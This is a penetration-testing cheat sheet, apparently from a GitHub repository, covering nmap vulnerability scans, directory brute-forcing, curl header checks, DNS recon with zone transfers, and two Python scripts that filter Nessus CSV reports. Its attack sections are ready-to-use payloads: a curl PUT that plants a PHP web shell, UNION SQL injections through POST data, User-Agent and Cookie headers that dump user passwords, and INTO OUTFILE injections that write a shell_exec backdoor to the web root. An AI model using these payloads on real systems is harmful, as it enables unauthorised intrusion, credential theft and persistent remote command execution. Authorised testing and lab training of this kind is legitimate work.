
### Service identify
```

nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254
nmap --script=http-headers 192.168.1.0/24 #headers 
nmap -p445 --script smb-vuln-ms17-010 192.168.1.0/24
nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24 #Heartbleed SSL
nmap -v -p 80 --script http-vuln-cve2010-2861 $IP` #ColdFusion webservers with a known directory traversal vuln
nmap --script http-iis-webdav-vuln -p80,8080 10.11.1.13 #iis-webdav
nmap --script smb-enum-shares.nse -p445#
nmap -sT -sV -Pn -p 7001 --script +http-headers,+http-methods,+http-enum 192.168.1.99
```



### Directories Enumeration to Identify where entry point is exist

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302,307,401,403 -t 25 -x php dir -u 192.168.1.1 -e

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.1/FUZZ

wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ

```

## Advance curl
```
curl -s -I http://example.org | grep '^HTTP'
curl -s -I https://example.org | grep '^HTTP'
curl -s -I https://example.org | grep '^Strict'
curl --sslv3 https://example.org
curl --tlsv1.0 -I https://example.org
curl --tlsv1.1 -I https://example.org
curl --tlsv1.2 -s -I https://example.org | grep 'HTTP'
curl -s -I https://example.org | grep '^X-Frame-Options'
curl -s -I https://example_2.org | grep '^X-Frame-Options'
curl -s -I https://example.org | grep '^X-Content'
curl -s -I example.com/url_that_sets_cookie | grep '^Set-Cookie'
nmap -p 443,80 --script http-security-headers
curl -I -L --url <target domain or IP>
curl -L http://www.google.com (HTTP Location Headers with -L option)
curl -I 
curl -x http://10.10.10.10:8080 -L http://sample.com (Local Proxy)
curl -v https://google.com (Testing a connection to a remote site)
curl -I -H 'Accept-Encoding: gzip,deflate' http://example.com/index.php (Checking Header)
curl -v -X OPTIONS http://192.168.56.103 (Check OPTIONS)
curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.200.150/1.php
```
### DNS Recon and MX Record
```
nslookup -query=mx redhat.com
nslookup -type=ns redhat.com
nslookup -type=soa redhat.com
nslookup -type=any google.com
Using Specific DNS server
nslookup redhat.com ns1.redhat.com
nslookup -port 56 redhat.com
nslookup -debug redhat.com
whois domain-name-here.com
Perform DNS IP Lookup (dig a domain-name-here.com @nameserver )
Perform MX Record Lookup (dig mx domain-name-here.com @nameserver)
Perform Zone Transfer with DIG(dig axfr domain-name-here.com @nameserver)
dig 1.1.1.1 -t any
dig 1.1.1.1 -t mx
dig 1.1.1.1 -t axfr
dig -x 1.1.1.1

dnsrecon -d 1.1.1.1
dnsenum nintendo.com
host -t ns megacorpone.com
host -t mx megacorpone.com
host idontexist.megacorpone.com
```

### SQL Injection

**POST Method**
```
POST Data: username=tom' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +
POST Data: username=tom' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +&submit=Submit #After knowing DatabaseName
POST Data: username=tom' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1,1 -- +&submit=Submit #After Knowing Tables Name where exist in the base
POST Data: username=tom' UNION SELECT group_concat(name,0x0a,password),2,3,4,5,6,7,8 from users LIMIT 1,1 -- +&submit=Submit
POST Data: username=tom' UNION SELECT group_concat(name,0x0a,password,0x0a,email),2,3,4,5,6,7,8 from users LIMIT 1,1 -- +&submit=Submit
```
**user agent**
```
User-Agent: Brick_Browser' UNION SELECT 1,2,3,4,5,6,7,8 -- +
User-Agent: Brick_Browser' UNION SELECT database(),version(),user(),4,5,6,7,8 limit 1,1 -- +
User-Agent: Brick_Browser' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +
User-Agent: Brick_Browser' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1, 1 -- +
Brick_Browser' UNION SELECT group_concat(name,0x0a,password),2,3,4,5,6,7,8 from users LIMIT 1,1 -- +
```
**CookieMethod**
```
Cookie: User=tom' and 1=2 order by 8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=2 union select 1,2,3,4,5,6,7,8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,2,3,4,5,6,7,8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,database(),3,4,5,6,7,8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,group_concat(column_name,0x0a),3,4,5,6,7,8 from information_schema.columns where table_name='users'  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
```

**Shell Upload**
```
http://10.11.1.252:8000/edit_type.php?type_id=-1 union all select '<?php echo shell_exec($_GET['cmd']);?>' into OUTFILE '/var/www/html/cmd.php';#
```
```
http://10.11.1.252:8000 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```




### Nesscus CSV Custom Report
 
![](https://raw.githubusercontent.com/Tennys0n/Routine_Pentest_Task/master/Data/Nesscus.PNG) 
```

#!/usr/bin/python3
import csv
f = open('Test_nessus.csv', 'r')
try:
    rownum = 0
    reader = csv.reader(f)
    for row in reader:
        
        if rownum == 0:
            header = row
        else:
            colnum = 0
            if row[3].lower() == 'high':
                print ('%-1s: %s     %-1s: %s     %-1s: %s     %-1s: %s' % (header[3], row[3],header[4], row[4],header[5], row[5],header[6], row[6]))
        rownum += 1
finally:
    f.close()

```

![](https://raw.githubusercontent.com/Tennys0n/Routine_Pentest_Task/master/Data/Nesscus-2.PNG)
```
#!/usr/bin/python3
import csv
f = open('Test_nessus.csv', 'r')
try:
    print ('/---------------------------------------------------/')
    rownum = 0
    hosts = {}
    reader = csv.reader(f)
    for row in reader:
        # Save header row.
        if rownum == 0:
            header = row
        else:
            colnum = 0
            if row[3].lower() == 'high' and row[4] not in hosts:
                hosts[row[4]] = row[4]
                print ('%-1s: %s     %-1s: %s     %-1s: %s     %-1s: %s' % (header[3], row[3],header[4], row[4],header[5], row[5],header[6], row[6]))
        rownum += 1
finally:
    f.close()
```





